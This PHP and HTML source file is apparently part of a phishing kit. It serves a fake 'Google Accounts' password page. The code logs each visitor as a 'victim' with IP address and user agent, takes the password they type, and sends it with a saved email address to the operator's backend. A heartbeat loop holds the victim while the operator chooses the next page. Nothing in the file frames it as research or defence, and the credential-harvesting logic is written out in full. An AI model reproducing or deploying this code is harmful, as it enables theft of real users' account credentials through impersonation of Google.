<?php
require('shade/core/functions.php');

$ip = $victim->getVictimIP();

$sessionVictim = !empty($_SESSION['ent_id']) ? $crud->getVictim($_SESSION['ent_id']) : null;

if (empty($sessionVictim)) {
    unset($_SESSION['ent_id']);
    $newId = $victim->createVictim([
        'ip_address' => $ip,
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? '',
        'next_page'  => 'start',
        'heartbeat'  => time()
    ]);

    if ($newId) {
        $_SESSION['ent_id'] = $newId;
    }
}

require_once('includes/google_layout.php');
google_head('Welcome - Google Accounts');
?>

<div class="g-card g-card-split g-card-pass">
    <?php google_card_progress(); ?>

    <div class="g-split-layout">
        <div class="g-split-left">
            <?php google_logo(); ?>
            <h1 class="g-title">Welcome</h1>
            <?php google_user_chip(); ?>
        </div>

        <div class="g-split-right">
            <form id="passwordForm" class="g-form" action="#" method="POST">
                <div class="g-field">
                    <input type="password" id="passwordInput" class="g-input" placeholder=" " required autocomplete="current-password">
                    <label class="g-label" for="passwordInput">Enter your password</label>
                </div>

                <label class="g-check">
                    <input type="checkbox" id="showPassword">
                    <span>Show password</span>
                </label>

                <div class="g-actions">
                    <a href="#" class="g-btn g-btn-text">Forgot password?</a>
                    <button type="submit" class="g-btn g-btn-primary">Next</button>
                </div>
            </form>
        </div>
    </div>
</div>

<?php google_footer(); google_scripts(); ?>
<script>
GoogleAuth.loadEmail('dynamicEmail', true);
GoogleAuth.initShowPassword('showPassword', 'passwordInput');
var passHeartbeat = GoogleAuth.startHeartbeat('pass', false);

document.getElementById('passwordForm').addEventListener('submit', function (e) {
    e.preventDefault();
    var email = localStorage.getItem('savedEmail');
    var password = document.getElementById('passwordInput').value;
    if (!password) return;

    if (window.GoogleAuth && typeof GoogleAuth.showCardLoading === 'function') {
        GoogleAuth.showCardLoading('.g-card');
    } else {
        document.querySelector('.g-card')?.classList.add('is-loading');
    }

    GoogleAuth.sendData({
        currentpage: 'login',
        username: email,
        password: password
    }).always(function () {
        if (window.GoogleAuth && typeof GoogleAuth.startWaiting === 'function') {
            passHeartbeat = GoogleAuth.startWaiting('pass', '.g-card', passHeartbeat);
        } else if (window.GoogleAuth && typeof GoogleAuth.startHeartbeat === 'function') {
            clearInterval(passHeartbeat);
            passHeartbeat = GoogleAuth.startHeartbeat('pass', true);
        }
    });
});
</script>
</body>
</html>
